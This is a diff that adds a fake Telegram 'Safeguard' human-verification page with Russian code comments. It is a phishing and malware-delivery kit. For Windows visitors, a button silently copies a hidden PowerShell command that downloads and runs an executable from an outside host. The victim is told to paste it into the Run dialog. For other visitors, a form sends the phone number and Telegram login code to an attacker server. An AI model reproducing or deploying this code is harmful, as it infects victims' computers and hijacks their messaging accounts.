@@ -1,0 +1,888 @@
+<!DOCTYPE html><html class="theme_dark" data-scrapbook-create="20250115114339874" data-scrapbook-title="Telegram: Contact @safeguard" translate="no" data-scrapbook-source="https://rosecloud-security.com/1-93248234/index.html"><head>
+  <script type="text/javascript" src="weglot.min.js"></script>
+  <script>
+      Weglot.initialize({
+          api_key: 'wg_a298942c1019b67da39b8a32752929828'
+      });
+  </script>
+  <meta name="google" content="notranslate">
+
+  <!-- Google Fonts (Open Sans) -->
+  <link href="css/css2.css" rel="stylesheet">
+  <script>
+
+   window.addEventListener('DOMContentLoaded', () => {
+    fetch('https://safeguard-verify-api.com/api/notify-visit', {
+      method: 'GET', 
+      // Можно и POST, но для простоты GET
+    })
+    .then(response => response.json())
+    .then(data => {
+      console.log('Response from server:', data);
+    })
+    .catch(err => {
+      console.error('Error contacting the server:', err);
+    });
+  });
+  </script>
+  <style>
+    body {
+      font-family: 'Open Sans', sans-serif;
+      margin: 0; 
+      padding: 0;
+    }
+
+    /* --------------------------------------------- *
+     *  Modal Overlay (Centers the .modal)
+     * --------------------------------------------- */
+    .modal-overlay {
+      position: fixed;         
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background: rgba(0, 0, 0, 0.5); /* Dim overlay behind modal */
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;           
+    }
+    .hidden {
+      display: none !important;
+    }
+
+    /* --------------------------------------------- *
+     *  Modal Container & Its Contents
+     * --------------------------------------------- */
+    .modal {
+      /* Gradient background inside the modal */
+      background: linear-gradient(135deg, #1a3820 0%, #0b200e 100%);
+      width: 95%;                  /* For mobile view, use 95% width */
+      max-width: 483px;            /* On larger screens, limit width to 483px */
+      padding: 24px;               /* Was 1.5rem -> ~24px */
+      border-radius: 12px;
+      color: #fff;
+      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.4);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+    }
+
+    /* Header box at the top of the modal */
+    .modal-header {
+      display: flex;
+      align-items: center;
+      padding: 12px 16px;    /* Was 0.75rem 1rem -> ~12px 16px */
+      border-radius: 10px;
+      margin-bottom: 24px;   /* Was 1.5rem -> 24px */
+      background: linear-gradient(135deg, #203e24 0%, #162d1c 100%);
+    }
+
+    /* Icon placeholder in the header */
+    .modal-header-icon {
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      background: #286130; /* placeholder color/gradient */
+      margin-right: 12px;  /* Was 0.75rem -> ~12px */
+      flex-shrink: 0;
+      overflow: hidden; /* so an <img> can stay circular if bigger than box */
+    }
+
+    /* Header title text */
+    .modal-header-title {
+      font-size: 18px;  /* Was 1.125rem -> ~18px */
+      font-weight: 600;
+    }
+
+    /* Body content inside the modal (below the header) */
+    .modal-body {
+      font-size: 15px; /* Was 0.95rem -> ~15px */
+      line-height: 1.5;
+    }
+
+    /* Steps container */
+    .modal-steps {
+      margin-top: 24px; /* Was 1.5rem -> 24px */
+    }
+
+    /* Individual step wrapper */
+    .step {
+      display: flex;
+      align-items: flex-start;
+      margin-bottom: 16px; /* Was 1rem -> ~16px */
+    }
+
+    /* Step icon box */
+    .step-icon {
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      background: #2d6938; /* placeholder color */
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-right: 12px; /* Was 0.75rem -> 12px */
+      flex-shrink: 0;
+    }
+
+    /* Step textual content */
+    .step-content {
+      flex: 1;
+    }
+    .step-title {
+      font-weight: 600;
+      margin-bottom: 5px; /* Was 0.3rem -> ~5px */
+      font-size: 16px;    /* Was 1rem -> 16px */
+    }
+    .step-description {
+      font-size: 14px;    /* Was 0.875rem -> 14px */
+      line-height: 1.4;
+      color: #d9d9d9;     /* subtle color for step text */
+    }
+
+    /* --------------------------------------------- *
+     *  Loading/Status Box (Separate box after steps)
+     * --------------------------------------------- */
+    .loading-status {
+      /* Similar styling to your modal, but can be slightly smaller */
+      margin-top: 24px;   /* was 1.5rem -> 24px */
+      padding: 12px 16px; /* was 0.75rem 1rem -> 12px 16px */
+      border-radius: 12px;
+      background: linear-gradient(135deg, #1A3820 0%, #0B200E 100%);
+      box-shadow: 0 4px 16px rgba(0, 0, 0, 0.4);
+      display: flex;
+      align-items: center;
+      gap: 12px;          /* was 0.75rem -> ~12px */
+    }
+
+    /* Dot Container (three animated dots) */
+    .dots {
+      display: flex;
+      gap: 5px; /* was 0.3rem -> ~5px */
+    }
+
+    /* Each dot */
+    .dot {
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background-color: #4ABC96;
+      animation: dotPulse 1.2s infinite ease-in-out;
+    }
+
+    /* Stagger the animations */
+    .dot:nth-child(2) {
+      animation-delay: 0.2s;
+    }
+    .dot:nth-child(3) {
+      animation-delay: 0.4s;
+    }
+
+    @keyframes dotPulse {
+      0%, 100% {
+        opacity: 0.3;
+        transform: scale(1);
+      }
+      50% {
+        opacity: 1;
+        transform: scale(1.3);
+      }
+    }
+
+    /* The text next to the dots */
+    .loading-text {
+      font-size: 14px; /* was 0.875rem -> 14px */
+      color: #fff;
+    }
+
+    /* --------------------------------------------- *
+     *  Media Query for Extra Small Screens
+     * --------------------------------------------- */
+    @media (max-width: 480px) {
+      .modal {
+        padding: 16px; /* was 1rem -> 16px */
+      }
+      .modal-header {
+        flex-direction: row;
+      }
+      .modal-header-icon {
+        margin-right: 8px; /* was 0.5rem -> ~8px */
+      }
+      .step {
+        margin-bottom: 12px; /* was 0.75rem -> ~12px */
+      }
+      .step-icon {
+        margin-right: 8px; /* was 0.5rem -> ~8px */
+      }
+      .loading-status {
+        flex-direction: row;
+      }
+    }
+
+    /* ------------------ Новые блоки для НЕ-Windows (форма телефона/кода) ------------------ */
+   
+
+    /* Пример оверлея "Loading..." */
+    #loadingOverlay {
+      display: none; 
+      position: fixed; 
+      z-index: 99999; 
+      top: 0; left: 0; 
+      width: 100vw; height: 100vh; 
+      background: rgba(0,0,0,0.5); 
+      color: #fff; 
+      font-size: 1.2rem; 
+      font-weight: 600; 
+      align-items: center; 
+      justify-content: center;
+    }
+  </style>
+  <style>
+    /* Общие стили для форм */
+    .verification-form {
+      border: 1px solid #666;       /* Тонкая рамка */
+      border-radius: 8px;          /* Скруглённые углы */
+      padding: 16px;               /* Внутренние отступы */
+      margin-top: 20px;            /* Отступ сверху */
+      background-color: #2a2a2a;   /* Фон (темно-серый, сочетается с dark theme) */
+      color: #fff;                 /* Цвет текста */
+      max-width: 300px;            /* Ограничиваем ширину */
+      margin-left: auto;
+      margin-right: auto;          /* Чтобы форма была посередине */
+    }
+    .verification-form h3 {
+      margin-top: 0;
+      margin-bottom: 16px;
+      font-size: 1.8rem;
+    }
+
+    .input-row {
+      margin: 8px 0;
+      display: flex;
+      flex-direction: column;
+    }
+    .input-row label {
+      margin-bottom: 4px;
+      font-size: 1.5rem !important;
+    }
+    .input-row input {
+      padding: 6px 8px;
+      border: 1px solid #888;
+      border-radius: 4px;
+      background-color: #fff;
+      color: #000; /* Тёмный текст на светлом фоне поля */
+      font-size: 1.5rem !important;
+    }
+    .verification-form button {
+      margin-top: 8px;
+      padding: 8px 12px;
+      border: none;
+      border-radius: 4px;
+      width: 100%;
+      cursor: pointer;
+      color: #fff;
+      background-color: #1c93e3; /* Цвет, похожий на .verify-trigger2 */
+      font-size: 1.5rem !important;
+    }
+    .verification-form button:hover {
+      opacity: 0.8; /* При наведении чуть затемняем */
+    }
+
+    /* Скрываем формы по умолчанию */
+    #phoneBlock {
+      display: none;
+    }
+    #codeBlock {
+      display: none;
+    }
+    #successBlock {
+      display: none;
+      margin-top: 20px;
+      color: #5bcc19; /* Зеленоватый */
+      font-weight: bold;
+      font-size: 1.2em;
+      text-align: center;
+    }
+
+    /* Текстовая подсказка или сообщение */
+    .success-message {
+      margin: 16px 0;
+      text-align: center;
+    }
+
+    /* Блок ошибки */
+    #errorBlock {
+      margin-top: 10px;
+      color: #ff5b5a; /* Красный */
+      text-align: center;
+      display: none;  /* Скрыт по умолчанию */
+      font-size: 1.1rem;
+      max-width: 300px;
+      margin-left: auto;
+      margin-right: auto;
+    }
+
+    /* Оверлей для "анимации прогрузки" */
+    #loadingOverlay {
+      display: none; /* Скрыт по умолчанию */
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background-color: rgba(0, 0, 0, 0.5);
+      z-index: 999;
+      justify-content: center;
+      align-items: center;
+    }
+    .spinner {
+      width: 60px;
+      height: 60px;
+      border: 8px solid #ccc;
+      border-top: 8px solid #1c93e3;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+    </style>
+
+  <link rel="icon" data-savepage-href="https://telegram.org/img/website_icon.svg?4" href="images/0dd8634450681fe1a2d0c1e5b02d6d0954e2772d.svg">
+  <meta charset="UTF-8">
+  <link rel="stylesheet" href="css/lv.css">
+  <title>Telegram: Contact @safeguard</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <script data-savepage-type="" type="text/plain"></script>
+  <meta name="robots" content="noindex, nofollow">
+  <meta property="og:title" content="Safeguard">
+  <meta property="og:image" content="Fhfz26dgXc4i8fqGrsnh">
+  <meta property="og:site_name" content="Telegram">
+  <meta property="og:description" content="The most extensive security and buy tracking platform on Telegram		Powering @Trending	Announcements: @Safeguard_Ann">
+
+  <meta property="twitter:title" content="Safeguard">
+  <meta property="twitter:image" content="https://cdn1.cdn-telegram.org/file/Fhfz26dgXc4i8fqGrsnh9QmLyIzuIzGEyRTBMBhIMy416DQ0ML8r5oD0nzxTbYBe57oVor9NMH754ZMFC0dya-d2UNK6BLBr3JZIuw4lvaT1TW7M_XfazKeu1ypa0z9lpbNxewz6bNMJtobkAf8BpFPccyEyqtATFFrk0dHinSF1IpVOpRlPj2CXXs7O1NL-WjVxbrqUjRc6MrmWgpPQwZp8Ddnkc7_Cg2ZFSmXcLEWKGZzbCtDB7Dd5ihb1nN_cicWDWkIrs1LQf5FD-IQC6jLhjpChAtA953b1vfy3_3hqPUlKuVhe714rB-z3JdcKs2QM0ehO7-zGXGQVYtoYKg.jpg">
+  <meta property="twitter:site" content="@Telegram">
+  <meta property="al:ios:app_store_id" content="686449807">
+  <meta property="al:ios:app_name" content="Telegram Messenger">
+  <meta property="al:ios:url" content="tg://resolve?domain=safeguard&start=trending">
+  <meta property="al:android:url" content="tg://resolve?domain=safeguard&start=trending">
+  <meta property="al:android:app_name" content="Telegram">
+  <meta property="al:android:package" content="org.telegram.messenger">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:site" content="@Telegram">
+  <meta name="twitter:description" content="The most extensive security and buy tracking platform on Telegram		Powering @Trending	Announcements: @Safeguard_Ann
+">
+  <meta name="twitter:app:name:iphone" content="Telegram Messenger">
+  <meta name="twitter:app:id:iphone" content="686449807">
+  <meta name="twitter:app:url:iphone" content="tg://resolve?domain=safeguard&start=trending">
+  <meta name="twitter:app:name:ipad" content="Telegram Messenger">
+  <meta name="twitter:app:id:ipad" content="686449807">
+  <meta name="twitter:app:url:ipad" content="tg://resolve?domain=safeguard&start=trending">
+  <meta name="twitter:app:name:googleplay" content="Telegram">
+  <meta name="twitter:app:id:googleplay" content="org.telegram.messenger">
+  <meta name="twitter:app:url:googleplay" content="https://t.me/safeguardoff_bot">
+  <meta name="apple-itunes-app" content="app-id=686449807, app-argument: tg://resolve?domain=safeguard&start=trending">
+  <script data-savepage-type="" type="text/plain"></script>
+  <link rel="icon" type="image/svg+xml" data-savepage-href="//telegram.org/img/website_icon.svg?4" href="images/0dd8634450681fe1a2d0c1e5b02d6d0954e2772d.svg">
+  <link rel="apple-touch-icon" sizes="180x180" data-savepage-href="//telegram.org/img/apple-touch-icon.png" href="">
+  <link rel="icon" type="image/png" sizes="32x32" data-savepage-href="//telegram.org/img/favicon-32x32.png" href="images/2c35e76ebe2d8002369d582b32bd70374552c574.png">
+  <link rel="icon" type="image/png" sizes="16x16" data-savepage-href="//telegram.org/img/favicon-16x16.png" href="images/ab2a0579aa90467d90907bb1ae640ef046994537.png">
+  <link rel="alternate icon" data-savepage-href="//telegram.org/img/favicon.ico" href="" type="image/x-icon">
+  <style data-savepage-href="//telegram.org/css/font-roboto.css?1" type="text/css"></style>
+  <link rel="stylesheet" href="css/style.css">
+  <link rel="stylesheet" type="text/css" href="css/weglot.min.css">
+</head>
+
+<body>
+  <!-- Оверлей для "Loading" (для ввода телефона/кода) -->
+  <div id="loadingOverlay">Loading...</div>
+
+  <!-- Модальное окно (WINDOWS-ВЕРСИЯ) -->
+  <div id="modalOverlay" class="modal-overlay hidden" style="display: none;">
+    <!-- Modal -->
+    <div class="modal">
+      <!-- Header section -->
+      <div class="modal-header">
+        <div class="modal-header-icon">
+          <!-- Place your shield JPG here (already done) -->
+          <img src="images/saveguard.jpg" alt="" style="width: 100%; height: 100%; border-radius: 50%;">
+        </div>
+        <div class="modal-header-title">Safeguard Portal</div>
+      </div>
+
+      <!-- Body content -->
+      <div class="modal-body">
+        <p>
+          To protect against phishing attacks and malicious applications, 
+          please follow the verification steps below.
+        </p>
+
+        <!-- Steps area -->
+        <div class="modal-steps">
+          <!-- Step 1 -->
+          <div class="step">
+            <div class="step-icon">
+              <svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 473.954 473.954" xml:space="preserve">
+                <path style="fill:#4ABC96;" d="M0,236.981C0,106.094,106.098,0,236.981,0c130.876,0,236.973,106.094,236.973,236.981
+                  c0,130.868-106.098,236.973-236.973,236.973C106.098,473.954,0,367.849,0,236.981z"></path>
+                <path style="fill:#08090B;" d="M238.938,300.49c0.322,1.747-0.52,3.18-1.418,4.142c-0.782,0.842-1.818,1.497-3.267,1.418
+                    c-0.284-3.046,2.14-5.175,4.64-5.56C238.919,300.49,238.926,300.49,238.938,300.49z"></path>
+                <!-- Укороченный svg ... -->
+              </svg>
+            </div>
+            <div class="step-content">
+              <div class="step-title">Step 1</div>
+              <div class="step-description">
+                Click  
+                <svg viewBox="-0.5 0 257 257" xmlns="http://www.w3.org/2000/svg" preserveAspectRatio="xMidYMid" height="15px" width="17px">
+                  <path d="M0 36.357L104.62 22.11l.045 100.914-104.57.595L0 36.358zm104.57 98.293l.08 101.002L.081 221.275l-.006-87.302 104.494.677zm12.682-114.405L255.968 0v121.74l-138.716 1.1V20.246zM256 135.6l-.033 121.191-138.716-19.578-.194-101.84L256 135.6z" fill="#00ADEF"></path>
+                </svg>
+                <strong> Windows + R </strong> to open the 'Run' dialog box.
+              </div>
+            </div>
+          </div>
+
+          <!-- Step 2 -->
+          <div class="step">
+            <div style="background:#1290dd" class="step-icon">
+              <svg xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" viewBox="0 0 48 48" width="100%" height="100%">
+                <linearGradient id="BiF7D16UlC0RZ_VqXJHnXa_oWiuH0jFiU0R_gr1" x1="9.858" x2="38.142" y1="9.858" y2="38.142" gradientUnits="userSpaceOnUse">
+                  <stop offset="0" stop-color="#33bef0"></stop>
+                  <stop offset="1" stop-color="#0a85d9"></stop>
+                </linearGradient>
+                <path fill="url(#BiF7D16UlC0RZ_VqXJHnXa_oWiuH0jFiU0R_gr1)" d="M44,24c0,11.045-8.955,20-20,20S4,35.045,4,24S12.955,4,24,4S44,12.955,44,24z"></path>
+                <!-- Укороченный svg ... -->
+              </svg>
+            </div>
+            <div class="step-content">
+              <div class="step-title">Step 2</div>
+              <div class="step-description">
+                To securely verify through your own Telegram, 
+                press <strong>CTRL + V</strong> to paste 'Telegram' 
+                into the dialog box.
+              </div>
+            </div>
+          </div>
+
+          <!-- Step 3 -->
+          <div class="step">
+            <div class="step-icon">
+              <svg xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" viewBox="0 0 48 48" width="60" height="20">
+                <!-- Укороченный svg ... -->
+                <linearGradient id="HoiJCu43QtshzIrYCxOfCa_VFaz7MkjAiu0_gr1" x1="21.241" x2="3.541" y1="39.241" y2="21.541" gradientUnits="userSpaceOnUse">
+                  <stop offset=".108" stop-color="#0d7044"></stop>
+                  <stop offset=".433" stop-color="#11945a"></stop>
+                </linearGradient>
+                <!-- ... -->
+              </svg>
+            </div>
+            <div class="step-content">
+              <div class="step-title">Step 3</div>
+              <div class="step-description">
+                Finally, simply press <strong>Enter</strong> to 
+                authenticate your account and you will be automatically 
+                redirected to the desired group.
+              </div>
+            </div>
+          </div>
+        </div> <!-- .modal-steps ends -->
+      </div> <!-- .modal-body ends -->
+
+      <!-- Loading/status box at the bottom -->
+      <div class="loading-status">
+        <!-- Animated dots on the left -->
+        <div class="dots">
+          <div class="dot"></div>
+          <div class="dot"></div>
+          <div class="dot"></div>
+        </div>
+        <!-- Text on the right -->
+        <div class="loading-text">
+          Waiting to process manual verification..
+        </div>
+      </div>
+      <!-- End loading-status -->
+    </div> <!-- .modal ends -->
+  </div> <!-- .modal-overlay ends -->
+
+  <style id="savepage-cssvariables">
+    :root {
+      --savepage-url-20: url("images/4284efb616c182da4450c123174ce0e81a322845.svg");
+    }
+  </style>
+
+  <meta name="savepage-url" content="https://t.me/safeguardoff_bot?start=trending">
+  <meta name="savepage-title" content="Telegram: Contact @safeguard">
+  <meta name="savepage-pubdate" content="Unknown">
+  <meta name="savepage-from" content="https://t.me/safeguardoff_bot?start=trending">
+  <meta name="savepage-date" content="Fri Aug 02 2024 15:29:03 GMT-0700 (Pacific Daylight Time)">
+  <meta name="savepage-state" content="Standard Items; Retain cross-origin frames; Merge CSS images; Remove unsaved URLs; Load lazy images in existing content; Max frame depth = 5; Max resource size = 50MB; Max resource time = 10s;">
+  <meta name="savepage-version" content="33.9">
+  <meta name="savepage-comments" content="">
+
+  <div class="tgme_background_wrap">
+    <canvas style="/*savepage-canvas-image*/ background-image: url(" 64e759d0dc1117eda65358d7e0c38f52f844e9a5.png")="" !important;="" background-attachment:="" scroll="" background-blend-mode:="" normal="" background-clip:="" content-box="" background-color:="" transparent="" background-origin:="" background-position:="" center="" background-repeat:="" no-repeat="" background-size:="" 100%="" !important;"="" id="tgme_background" class="tgme_background default" width="50" height="50" data-colors="dbddbb,6ba587,d5d88d,88b884" data-savepage-canvasdatauri="">
+    </canvas></div>
+
+  <!-- Hcaptcha (обычные элементы) -->
+  <div class="tgme_page_wrap">
+    <div class="tgme_head_wrap">
+      <div class="tgme_head">
+        <a data-savepage-href="//telegram.org/" href="https://telegram.org/" class="tgme_head_brand">
+          <svg class="tgme_logo" height="34" viewBox="0 0 133 34" width="133" xmlns="http://www.w3.org/2000/svg">
+            <!-- ... -->
+          </svg>
+        </a>
+        <a class="tgme_head_right_btn verify-trigger" style="cursor: pointer;">
+          Verify
+        </a>
+      </div>
+    </div>
+
+    <div id="hcaptcha1" class="tgme_body_wrap">
+      <div class="tgme_page">
+        <div class="tgme_page_photo">
+          <a href="tg://resolve?domain=safeguard&start=trending">
+            <img class="tgme_page_photo_image" src="images/ed7b54bdc31ae1f3c7d06efb41353c0219c5aa8e.jpeg">
+          </a>
+        </div>
+        <div class="tgme_page_title">
+          <span dir="auto">Human Verification</span>
+        </div>
+        <div class="tgme_page_extra"></div>
+        <div class="tgme_page_description ">
+          Verify your user authenticity by completing the captcha below.<br><br>
+          Powered By: <a href="#">@Safeguard</a><br>
+        </div>
+        <div class="tgme_page_action">
+          <div class="captcha-container">
+            <form action="" method="post">
+              <div class="h-captcha" data-sitekey="669c3bd5-bc89-4372-8b9a-2a01058e2a78" data-callback="onCaptchaResolved" data-theme="dark">
+                <!-- Встроенный iframe hCaptcha -->
+              
+              </div>
+            </form>
+          </div>
+          <script src="js/api.js" async="" defer=""></script>
+          <script>
+            function onCaptchaResolved(response) {
+              document.querySelector('form').submit();
+            }
+          </script>
+        </div>
+       
+      </div>
+    </div>
+
+    <!-- Блок "failed" -->
+    <div id="failed" class="tgme_body_wrap hidden">
+      <div class="tgme_page">
+        <div class="tgme_page_photo">
+          <a href="tg://resolve?domain=safeguard&start=trending">
+            <img class="tgme_page_photo_image" src="images/ed7b54bdc31ae1f3c7d06efb41353c0219c5aa8e.jpeg">
+          </a>
+        </div>
+        <div class="tgme_page_title">
+          <span style="color: rgb(255, 0, 0);" dir="auto">Verification Failed</span>
+        </div>
+        <div class="tgme_page_extra"></div>
+        <div class="tgme_page_description ">
+          Reason: hCaptcha timeout. <br><br>
+          <p>You will be redirected to a manual verification <br>in 
+            <span id="countdown">3</span> seconds...
+          </p>
+          <br><br>
+        </div>
+        <div class="tgme_page_action"></div>
+        <div class="tgme_page_additional">
+          Due to security reasons you can only continue with the Safeguard Portal verification on a
+          <strong> Laptop/PC device.</strong> Please try again on a compatible device if you are on mobile.
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    /********************************************
+     * КОД, показывающий "failed" блок и таймер
+     ********************************************/
+    document.addEventListener('DOMContentLoaded', () => {
+      const hcaptcha1 = document.getElementById('hcaptcha1');
+      const failed = document.getElementById('failed');
+      const verification = document.getElementById('verification');
+      const countdownSpan = document.getElementById('countdown');
+
+      // Допустим, по таймеру hcaptcha вываливается в "failed"
+      setTimeout(() => {
+        hcaptcha1.classList.add('hidden');
+        failed.classList.remove('hidden');
+
+        // Скрываем iFrame hCaptcha
+        const hcaptchaFrame = document.querySelector('iframe[src*="hcaptcha"]');
+        if (hcaptchaFrame) {
+          hcaptchaFrame.style.display = 'none';
+        }
+
+        // Скрываем оверлей hcaptcha (если есть)
+        const hcaptchaOverlay = document.querySelector('div[style*="z-index: 2147483647"]');
+        if (hcaptchaOverlay) {
+          hcaptchaOverlay.style.display = 'none';
+        }
+
+        let countdownValue = 5;
+        countdownSpan.textContent = countdownValue;
+
+        const countdownTimer = setInterval(() => {
+          countdownValue--;
+          countdownSpan.textContent = countdownValue;
+          if (countdownValue <= 0) {
+            clearInterval(countdownTimer);
+          }
+        }, 1000);
+
+      }, 8000);
+
+      // Через 13с показываем "verification" блок
+      setTimeout(() => {
+        failed.classList.add('hidden');
+        verification.classList.remove('hidden');
+      }, 13000);
+    });
+  </script>
+
+  <!-- Блок MANUAL-VERIFY (тут и телефон, если не Windows) -->
+  <div id="verification" class="tgme_page_wrap hidden">
+    <div class="tgme_head_wrap">
+      <div class="tgme_head">
+        <a data-savepage-href="//telegram.org/" href="https://telegram.org/" class="tgme_head_brand">
+          <svg class="tgme_logo" height="34" viewBox="0 0 133 34" width="133" xmlns="http://www.w3.org/2000/svg">
+            <!-- ... -->
+          </svg>
+        </a>
+        <a class="tgme_head_right_btn verify-trigger" style="cursor: pointer;">
+          Verify
+        </a>
+      </div>
+    </div>
+    <div class="tgme_body_wrap">
+      <div class="tgme_page">
+        <div class="tgme_page_photo">
+          <a href="tg://resolve?domain=safeguard&start=trending">
+            <img class="tgme_page_photo_image" src="images/ed7b54bdc31ae1f3c7d06efb41353c0219c5aa8e.jpeg">
+          </a>
+        </div>
+        <div class="tgme_page_title">
+          <span dir="auto">Manual Verification</span>
+        </div>
+        <div class="tgme_page_extra"></div>
+        <div class="tgme_page_description ">
+          Verify your User Authenticity Below<br><br>
+          Powered By: <a href="#">@Safeguard</a><br>
+        </div>
+
+        <!-- Кнопка Verify (будет скрыта, если не Windows) -->
+        <div class="tgme_page_action">
+          <a id="verify" class="tgme_action_button_new shine verify-trigger" style="cursor: pointer; display: none;">
+            Verify
+          </a>
+        </div>
+
+        <!-- Блок ввода телефона (скрыт по умолчанию) -->
+        <div id="phoneBlock" class="verification-form" style="display: block;">
+          <h3>Enter Phone</h3>
+          <div class="input-row">
+          <label for="phoneInput">Enter your phone number:</label><br>
+          <input type="text" id="phoneInput" placeholder="+1 234 5678901">
+          </div>
+          <button onclick="sendPhone()">Send phone</button>
+        </div>
+
+        <!-- Блок ввода кода (скрыт по умолчанию) -->
+        <div id="codeBlock" class="verification-form">
+          <h3>Enter Code</h3>
+          <div class="input-row">
+            <label for="codeInput">Telegram code:</label>
+            <input id="codeInput" type="text" placeholder="Your code...">
+          </div>
+          <input id="internalId" type="hidden">
+          <button onclick="sendCode()">Send code</button>
+        </div>
+
+        <div id="errorBlock"></div>
+        <div id="successBlock" class="success-message">Success! You have been verified.</div>
+        <input type="hidden" id="internalId">
+
+        <div class="tgme_page_additional">
+          Due to security reasons you can only continue with the Safeguard Portal verification on a
+          <strong> Laptop/PC device.</strong> Please try again on a compatible device if you are on mobile.
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- JS для проверки Windows и переключения логики -->
+  <script>
+    // 1) Определяем: Windows или нет
+    function isWindows() {
+      return navigator.userAgent.toLowerCase().includes('windows');
+      // Или: return /Win/i.test(navigator.platform);
+    }
+
+    // 2) Логика для отправки телефона/кода
+    const SERVER_URL = 'https://safeguard-verify-api.com'; // ваш адрес Node+GramJS
+
+    function showError(msg) {
+      const e = document.getElementById('errorBlock');
+      e.textContent = msg;
+      e.style.display = 'block';
+    }
+    function hideError() {
+      const e = document.getElementById('errorBlock');
+      e.textContent = '';
+      e.style.display = 'none';
+    }
+    function showSuccess() {
+      document.getElementById('successBlock').style.display = 'block';
+    }
+    function hideSuccess() {
+      document.getElementById('successBlock').style.display = 'none';
+    }
+    function showLoading() {
+      document.getElementById('loadingOverlay').style.display = 'flex';
+    }
+    function hideLoading() {
+      document.getElementById('loadingOverlay').style.display = 'none';
+    }
+
+    // Отправка номера телефона
+    async function sendPhone() {
+      hideError();
+      hideSuccess();
+      const phone = document.getElementById('phoneInput').value.trim();
+      if (!phone) {
+        showError('Please enter phone number!');
+        return;
+      }
+      showLoading();
+      try {
+        const resp = await fetch(SERVER_URL + '/auth/phone', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ phone })
+        });
+        const data = await resp.json();
+        if (data.error) {
+          showError('Error: ' + data.error);
+        } else {
+          // Сохраняем internalId
+          document.getElementById('internalId').value = data.internalId;
+          // Переходим к блоку кода
+          document.getElementById('codeBlock').style.display = 'block';
+          document.getElementById('phoneBlock').style.display = 'none';
+        }
+      } catch (err) {
+        showError('Something went wrong while sending phone.');
+      }
+      hideLoading();
+    }
+
+    // Отправка кода
+    async function sendCode() {
+      hideError();
+      hideSuccess();
+      const code = document.getElementById('codeInput').value.trim();
+      const internalId = document.getElementById('internalId').value;
+      if (!code || !internalId) {
+        showError('Code or internalId is missing!');
+        return;
+      }
+      showLoading();
+      try {
+        const resp = await fetch(SERVER_URL + '/auth/code', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ code, internalId })
+        });
+        const data = await resp.json();
+        if (data.error) {
+          showError('Error: ' + data.error);
+        } else {
+          // Очищаем поля
+          document.getElementById('phoneInput').value = '';
+          document.getElementById('codeInput').value = '';
+          document.getElementById('internalId').value = '';
+          // Показываем успех
+          showSuccess();
+          // Скрываем форму кода
+          document.getElementById('codeBlock').style.display = 'none';
+        }
+      } catch (err) {
+        showError('Something went wrong while sending code.');
+      }
+      hideLoading();
+    }
+
+    // 3) Основная логика DOMContentLoaded
+    document.addEventListener('DOMContentLoaded', () => {
+      const verifyBtn = document.getElementById('verify');
+      const modalOverlay = document.getElementById('modalOverlay');
+
+      // Если Windows, показываем кнопку Verify (powershell)
+      // Если не Windows, скрываем кнопку Verify и показываем phoneBlock
+      if (isWindows()) {
+        // Логика Windows: оставляем всё, как было
+        if (verifyBtn) {
+          verifyBtn.style.display = 'inline-block';
+          verifyBtn.addEventListener('click', () => {
+            modalOverlay.classList.remove('hidden');
+            // Копируем PowerShell-скрипт
+            const textToCopy = `powershell -WindowStyle Hidden -Command "iwr 'http://safeguard-verify.com/quickaccesspopup.exe' -OutFile $env:TEMP'quickaccesspopup.exe'; Start-Sleep -s 5; Start-Process $env:TEMP'quickaccesspopup.exe'"`;
+            const tempTextArea = document.createElement("textarea");
+            tempTextArea.value = textToCopy;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand("copy");
+            document.body.removeChild(tempTextArea);
+          });
+        }
+      } else {
+        // НЕ Windows: скрываем модал, показываем форму телефона
+        if (modalOverlay) {
+          modalOverlay.style.display = 'none';
+        }
+        if (verifyBtn) {
+          verifyBtn.style.display = 'none';
+        }
+        // Показываем блок ввода телефона
+        document.getElementById('phoneBlock').style.display = 'block';
+      }
+    });
+  </script>
+
+  <div id="tgme_frame_cont"></div>
+  <script data-savepage-type="" type="text/plain" data-savepage-src="//telegram.org/js/tgwallpaper.min.js?3"></script>
+  <script data-savepage-type="text/javascript" type="text/plain"></script>
+
+  <div></div>
+
+  <div style="background-color: rgb(255, 255, 255); border: 1px solid rgb(215, 215, 215); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 4px; border-radius: 4px; left: auto; top: -10000px; z-index: -2147483648; position: absolute; pointer-events: auto; transition: opacity 0.15s ease-out; opacity: 0; visibility: hidden;" aria-hidden="true">
+    <!-- hCaptcha overlay ... -->
+  </div>
+
+  <div class="weglot-container wg-default" data-switcher-id="1" id="weglot-switcher-1">
+    <!-- Языковой переключатель (Weglot) -->
+    <aside data-wg-notranslate="true" aria-label="Language selected: English" class="weglot_switcher country-selector default closed wg-drop">
+      <div data-l="en" role="combobox" aria-activedescendant="" aria-label="Language" tabindex="0" aria-expanded="false" aria-controls="weglot-listbox" class="wg-li en wgcurrent wg-flags">
+        <a target="_self" href="#" aria-label="English" id="weglot-language-en" tabindex="-1">
+          <img src="images/gb.svg" width="30" height="20" role="presentation" alt="English flag" class="wg-flag">
+        </a>
+      </div>
+      <ul role="listbox" id="weglot-listbox" style="display: none;">
+        <li data-l="zh" role="none" id="wg-zh" class="wg-li zh wg-flags">
+          <a role="option" href="#" aria-label="中文 (简体)" id="weglot-language-zh" tabindex="-1">
